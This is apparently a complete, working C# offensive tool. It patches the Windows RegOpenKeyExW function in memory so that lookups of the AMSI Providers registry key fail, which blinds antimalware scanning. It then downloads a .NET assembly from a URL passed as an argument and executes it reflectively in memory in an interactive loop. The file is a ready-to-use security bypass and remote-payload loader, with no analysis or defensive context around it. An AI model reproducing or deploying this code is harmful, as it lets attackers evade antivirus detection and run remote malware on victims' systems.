using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;

public static class TrollDisappearKey
{
    [DllImport("KERNELBASE.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate int delegateRegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);

    static public int oldProtect;
    static public IntPtr targetAddr, hookAddr;
    static public byte[] originalBytes;
    static public byte[] hookBytes;
    static public int hookLength;
    static public int counter = 0;
    static public bool is64 = IntPtr.Size == 8;

    public static void DisappearKey()
    {
        delegateRegOpenKeyExW A = RegOpenKeyWDetour;

        targetAddr = GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "RegOpenKeyExW");
        hookAddr = Marshal.GetFunctionPointerForDelegate(A);

        if (is64)
        {
            hookLength = 12;
            originalBytes = new byte[hookLength];
            Marshal.Copy(targetAddr, originalBytes, 0, hookLength);
            hookBytes = new byte[] { 0x48, 0xB8 } // mov rax, imm64
                .Concat(BitConverter.GetBytes((long)hookAddr))
                .Concat(new byte[] { 0x50, 0xC3 }) // push rax; ret
                .ToArray();
        }
        else
        {
            hookLength = 6;
            originalBytes = new byte[hookLength];
            Marshal.Copy(targetAddr, originalBytes, 0, hookLength);
            int offset = (int)hookAddr - ((int)targetAddr + 5);
            hookBytes = new byte[] { 0xE9 }
                .Concat(BitConverter.GetBytes(offset))
                .Concat(new byte[] { 0x90 }) // NOP padding
                .ToArray();
        }

        VirtualProtect(targetAddr, hookLength, 0x40, out oldProtect);
        Marshal.Copy(hookBytes, 0, targetAddr, hookLength);
    }

    static public int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
    {
        try
        {
            Marshal.Copy(originalBytes, 0, targetAddr, hookLength);

            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
            {
                counter++;
                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
            }

            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);
        }
        finally
        {
            if (counter == 0)
            {
                Marshal.Copy(hookBytes, 0, targetAddr, hookLength);
            }
        }
    }

    public static void Main(string[] args)
    {
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

        if (args[1].Split(',')[0] != "disable")
        {
            DisappearKey();
        }

        ExecuteAssembly(new WebClient().DownloadData(args[0]), args[1]);
    }

    public static void ExecuteAssembly(Byte[] assemblyBytes, string comma_separated_args)
    {
        Assembly assembly = Assembly.Load(assemblyBytes);
        MethodInfo method = assembly.EntryPoint;

        object[] parameters = new object[] { comma_separated_args.Split(',') };
        string input = "";

        while (input != "exit")
        {
            method.Invoke(null, parameters);
            Console.Write("Pass in arguments comma delimited or type exit\r\n");
            input = Console.ReadLine();
            parameters = new object[] { input.Split(',') };
        }
    }
}
